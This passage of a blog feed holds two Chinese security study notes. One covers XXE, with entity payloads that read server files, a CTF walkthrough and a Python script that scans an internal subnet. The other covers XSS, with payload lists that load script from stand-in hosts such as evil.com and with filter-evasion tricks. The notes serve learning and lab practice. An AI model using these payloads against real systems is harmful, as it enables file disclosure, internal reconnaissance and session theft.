class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从当前文件夹读取文件可以使用&#x2F;proc&#x2F;self&#x2F;cwd</p><p>excel<br>首先用excel创建一个空白的xlsx，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir XXE &amp;&amp; cd XXE</span><br><span class="line">unzip ../XXE.xlsx</span><br></pre></td></tr></table></figure><p>将<code>[Content_Types].xml</code>改成恶意xml，再压缩回去<code>zip -r ../poc.xlsx *</code></p><h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="NCTF2019 True XML cookbook"></a>NCTF2019 True XML cookbook</h3><p>访问页面并抓包<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-2.png"><br>发现请求是xml格式的，首先构造payload尝试读取flag：<code>&lt;!ENTITY abc SYSTEM &quot;file:///flag&quot;&gt;</code>，失败，刚开始没打分号，xml有报错，发现文件路径在<code>/var/www/html/doLogin.php</code>，后面还是不行，可能是没有。尝试用php协议，<code> &lt;!ENTITY abc SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</code><br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-3.png"><br>解码后成功获得源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看上去是正常的来者，也没有提示有其他的方向或思路，尝试继续用上面的协议读取一些其他文件，尝试进行内网探测<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-4.png"><br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-5.png"><br>发现有一个奇怪的ip，尝试访问下<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-6.png"><br>有报错，尝试爆破下，失败了，看网上解析还需要查看其他的文件<code>file:///proc/net/fib_trie</code>。文件提供了关于FIB（Forwarding Information Base，转发信息库）Trie（前缀树）的信息。其作用是高效地存储和查找路由表项。它以一种前缀树的形式组织了路由表项，其中每个节点表示一个路由前缀。通过在树中进行前缀匹配，内核可以快速找到与目标IP地址最匹配的路由表项。<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line">url=<span class="string">&quot;http://b32f52cd-49a3-48fa-9f8f-da51aeed0e6d.node5.buuoj.cn:81/doLogin.php&quot;</span></span><br><span class="line">rawPayload=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.166.&#123;&#125;&quot;&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;]&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;user&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&amp;payload1;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/username&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;23&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/password&gt;&#x27;</span>\</span><br><span class="line">         <span class="string">&#x27;&lt;/user&gt;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    payload=rawPayload.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="comment">#payload=rawPayload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="built_in">format</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp=res.post(url,data=payload,timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(resp.text,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用脚本爆破出</p><h2 id="CVE-2021-29447"><a href="#CVE-2021-29447" class="headerlink" title="CVE-2021-29447"></a>CVE-2021-29447</h2><p><a href="https://www.freebuf.com/vuls/272446.html">https://www.freebuf.com/vuls/272446.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】XSS跨站脚本攻击</title>
      <link href="/2024/09/20/WebSecurity/owasptop/crosssitescripting/"/>
      <url>/2024/09/20/WebSecurity/owasptop/crosssitescripting/</url>
      
        <content type="html"><![CDATA[<p>这个笔记基础内容是基于WebGoat靶场撰写的<br>Cross Site Scripting (XSS) <a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a><br>XSS Filter Evasion Cheat Sheet ：<a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a><br>干货笔记！一文讲透XSS(跨站脚本)漏洞 <a href="https://cloud.tencent.com/developer/article/1969009">https://cloud.tencent.com/developer/article/1969009</a><br>他山之石 | 对 XSS 的一次深入分析认识 <a href="https://www.freebuf.com/articles/web/195507.html">https://www.freebuf.com/articles/web/195507.html</a><br>超全的xss绕过技巧 <a href="https://segmentfault.com/a/1190000044942572">https://segmentfault.com/a/1190000044942572</a><br>前端安全系列（一）：如何防止XSS攻击？ <a href="https://segmentfault.com/a/1190000016551188">https://segmentfault.com/a/1190000016551188</a></p><p>相关论文：</p><ul><li>Dancer in the Dark: Synthesizing and Evaluating Polyglots for Blind Cross-Site Scripting</li><li>Link: Black-Box Detection of Cross-Site Scripting Vulnerabilities Using Reinforcement Learning</li><li>Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild</li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>最基础的验证语句<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>，</p><p>XSS最常出现的地方：</p><ul><li>Search fields that echo a search string back to the user（将搜索字符串回显给用户的搜索字段）</li><li>Input fields that echo user data（回显用户数据的输入字段）</li><li>Error messages that return user-supplied text（返回用户输入文本的错误消息）</li><li>Hidden fields that contain user-supplied data（包含用户数据的隐藏字段）</li><li>Any page that displays user-supplied data（显示用户数据的任何页面）<ul><li>Message boards（留言板）</li><li>Free form comments（自由形式评论）</li></ul></li><li>HTTP Headers（HTTP头部）</li></ul><p>XSS攻击可能会导致：</p><ul><li>Stealing session cookies 窃取会话cookie</li><li>Creating false requests 创建虚假请求</li><li>Creating false fields on a page to collect credentials 在页面上创建用于收集凭据的虚假字段</li><li>Redirecting your page to a “non-friendly” site 将您的页面重定向到“不友好”的网站</li><li>Creating requests that masquerade as a valid user 创建伪装成有效用户的请求</li><li>Stealing of confidential information 窃取机密信息</li><li>Execution of malicious code on an end-user system (active scripting) 在最终用户系统上执行恶意代码（主动脚本）</li><li>Insertion of hostile and inappropriate content 插入敌对和不适当的内容</li></ul><p>XSS攻击类型：<br>反射型（Reflected）</p><ul><li>用户请求中的恶意内容通过Web浏览器显示给用户</li><li>服务器响应后，恶意内容被写入页面</li><li>需要社交工程学技巧</li><li>以用户在浏览器中继承的浏览器权限运行<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image.png"></li></ul><p>DOM-based（技术上也属于反射型）</p><ul><li>客户端脚本使用用户请求中的恶意内容将HTML写入其页面</li><li>类似于反射型XSS</li><li>以用户在浏览器中继承的浏览器权限运行</li></ul><p>存储型（Stored or persistent）</p><ul><li>恶意内容存储在服务器上（数据库、文件系统或其他对象），稍后显示给用户的Web浏览器</li><li>不需要社交工程学技巧</li></ul><p>除此之外还有下面这些xss类别：<br>mXSS：mXSS中文是突变型XSS，指的是原先的Payload提交是无害不会产生XSS，而由于一些特殊原因，如反编码等，导致Payload发生变异，导致的XSS。 <a href="https://www.freebuf.com/articles/network/409092.html">https://www.freebuf.com/articles/network/409092.html</a><br>UXSS：是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。UXSS 可以理解为Bypass 同源策略。</p><h2 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line">&lt;script&gt; alert(&quot;hack&quot;)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie</span><br><span class="line"></span><br><span class="line">&lt;img  src=1  onerror=alert(&quot;hack&quot;)&gt;</span><br><span class="line">&lt;img  src=1  onerror=alert(/hack/)&gt;</span><br><span class="line">&lt;img  src=1  onerror=alert(document.cookie)&gt;  #弹出cookie</span><br><span class="line">&lt;img  src=1  onerror=alert(123)&gt;      注：对于数字，可以不用引号</span><br><span class="line">&lt;img  src=&quot;javascript:alert(&quot;XSS&quot;);&quot;&gt;</span><br><span class="line">&lt;img  dynsrc=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;img  lowsrc=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;body background=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">// 由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM</span><br><span class="line">&lt;iframe src=”http://evil.com/xss.html”&gt;</span><br><span class="line"></span><br><span class="line">// 在某些浏览器中，如果标记的type属性&lt;input&gt;设置为image，则可以对其进行操作以嵌入脚本</span><br><span class="line">&lt;input type=&quot;image&quot; src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;table background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;td background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;div style=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line"></span><br><span class="line">// 该&lt;object&gt;标签可用于从外部站点脚本包含</span><br><span class="line">&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://hacker.com/xss.html&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;style onload=alert(1) /&gt;</span><br><span class="line"></span><br><span class="line">// Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。</span><br><span class="line">&lt;marquee behavior=&quot;alternate&quot; onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">&lt;marquee loop=&quot;1&quot; onfinish=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">&lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line"></span><br><span class="line">// media标签</span><br><span class="line">&lt;audio oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;  // 在用户可以开始播放音视频（audio/video）时触发；</span><br><span class="line">&lt;audio ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;  // 在音视频（audio/video）的时长发生变化时触发；</span><br><span class="line">&lt;audio autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onprogress=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;audio onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">&lt;video oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onprogress=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">&lt;video onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS-绕过技巧"><a href="#XSS-绕过技巧" class="headerlink" title="XSS 绕过技巧"></a>XSS 绕过技巧</h2><h3 id="Eval-其它冗余符号"><a href="#Eval-其它冗余符号" class="headerlink" title="Eval &amp; 其它冗余符号"></a>Eval &amp; 其它冗余符号</h3><p>如果目标系统的WAF或其它防护软件没把 <code>/(eval|replace)\(.+?\)/i</code> 这种样式列入黑名单，那么我们可以在其中通过夹杂冗余符号的方式形成Payload，利用其中的eval动作来加载Payload，再利用之后的replace动作把冗余符号进行替换删除。<br><code>eval(&#39;~a~le~rt~~(~~1~~)~&#39;.replace(/~/g, &#39;&#39;))</code><br>当引号被转义（escape）之后，不管使用了什么绕过技术，肯定会引起问题，就像上面的<code>eval(&#39;~a~le~rt~~(~~1~~)~&#39;.replace(/~/g, &#39;&#39;))</code>一样，如果要顺带把引号转义，其Payload可能如下：<br><code>eval(\&#39;~a~le~rt~~(~~1~~)~\&#39;.replace(/~/g, \&#39;\&#39;))</code><br>但另一种变换方法就是利用正则表达式来避免带入引号的使用，如可以在上述Payload中引入正斜杠方式，然后再用创建的正则表达式对象属性来访问其中的闭合字符串。示例如下：<br><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</code><br>以此用new String()来实现把~转换为空字符串的目的，从而不需要用到引号。<br>对引号实行转义并绕过WAF类产品模式匹配规则的一个有效手段是使用eval的String.fromCharCode方法，该方法将获取一个或多个十进制Unicode值，然后将它们转换成等效的ASCII字符，并将它们连成一个字符串，如：<br><code>console.log(String.fromCharCode(65,66,67,68))  //在终端返回显示的是字符串 &quot;ABCD&quot;</code><br>通过这种对Unicode值的转换，可以把目标值传递给eval，因此，可以构造Payload如下：<br><code>eval(String.fromCharCode(97,108,101,114,116,40,49,41))  //// 最终执行的会是 alert(1)</code></p><p>我们也可以采取其它方法来规避过滤。由于函数可以存储在JavaScript的变量中，所以为了不直接调用eval，我们可以把它分配给一个变量，然后间接调用它，示例如下：<br><code>var x = eval; x(&#39;alert(1)&#39;)</code><br>另外一种间接调用eval的方法是用括号进行构造，即用括号间接调用法，如表达式(1,2,3,4)返回的是4，即括号中最后一个，所以(1,eval)返回的是函数eval，具体示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(eval)    // 返回函数eval</span><br><span class="line">(1, eval) // 仍然返回函数eval</span><br></pre></td></tr></table></figure><p>因此可以构造以下Payload来执行：<code>(1, eval)(&#39;alert(1)&#39;)  // 返回 alert(1)</code><br>基于此，也可以使用call方法来直接调用，如下：<code>eval.call(null, &#39;alert(1)&#39;)  //返回 alert(1)</code><br>其次，可以定义一个新函数的方法来规避直接对eval的调用，当然这种方法还会涉及到一些语法定义，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function hackThePlanet () &#123;</span><br><span class="line"></span><br><span class="line">  alert(1)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，还可以用创建Function对象的方式来实现alert调用，该对象接受构造函数中的字符串作为函数实现，如下：<code>new Function(&#39;alert(1)&#39;)()</code></p><h3 id="利用错误输入过滤机制实现绕过"><a href="#利用错误输入过滤机制实现绕过" class="headerlink" title="利用错误输入过滤机制实现绕过"></a>利用错误输入过滤机制实现绕过</h3><p>删除机制：<br>也可能会删的不干净，如下是常见的绕过方式：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</code><br>上述javascript中，如果过滤器只是简单地把<code>&lt;script&gt;</code>和 <code>&lt;/script&gt;</code> 标签对删除了，那么最终会剩下：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>同样的方法可以应用到一些标签属性或事件处理程序中，就像如果onerror是删除目标，那么，我们可以构造以下Payload：<code>&lt;img src=x ononerrorerror=alert(1) /&gt;</code></p><p>替换机制：<br>如果目标系统的过滤器会把<code>&lt;script&gt;&lt;/script&gt;</code>标签对都过滤替换为NAUGHTY_HACKER字段，那么，我们提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 之后的结果就会是NAUGHTY_HACKERalert(1)NAUGHTY_HACKER。<br>但如果我们把&lt;<code>script&gt;标签对的声明改为&lt;script &lt;script&gt;&gt;</code> 和 <code>&lt;/script &lt;/script&gt;&gt;</code>这种嵌套式样式后，那么参照替换为NAUGHTY_HACKER字段的规则，对于<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来说，目标过滤器会把它过滤为：<br><code>&lt;script NAUGHTY_HACKER&gt;alert(1)&lt;/script NAUGHTY_HACKER&gt;</code><br>看上去是个莫名标签，但浏览器的容错机制仍会执行上面的代码</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p><a href="http://www.xssgame.com/">http://www.xssgame.com/</a><br>第一关直接插入就好了，来看第二关<br>测试xss的主要思路是看回显在哪里，通过自定义化输入闭合或绕过一些限制<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-1.png"><br>可以看到我们的输入回显在两个地方，针对第一个地方<code>onload=&quot;startTimer(&#39;1&#39;);&quot;</code>，在JS代码中，如：<code>var a = &#39;a&#39; + alert(); </code>，在运算过程中会自动执行响应函数，我们可以利用这里的onload函数<code>onload=&quot;startTimer(&#39;1&#39; + alert(1)+&#39;1&#39;);&quot; /&gt;</code>，构造这样的语句就可以实现弹窗，使用这个payload也可以实现：<code>&#39;); alert(1); //</code></p><p>第三关，根据提示，直接看代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">chooseTab</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Cat &quot;</span> + <span class="built_in">parseInt</span>(name) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/img/cat&quot;</span> + name + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tabContent&#x27;</span>).<span class="property">innerHTML</span> = html;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span 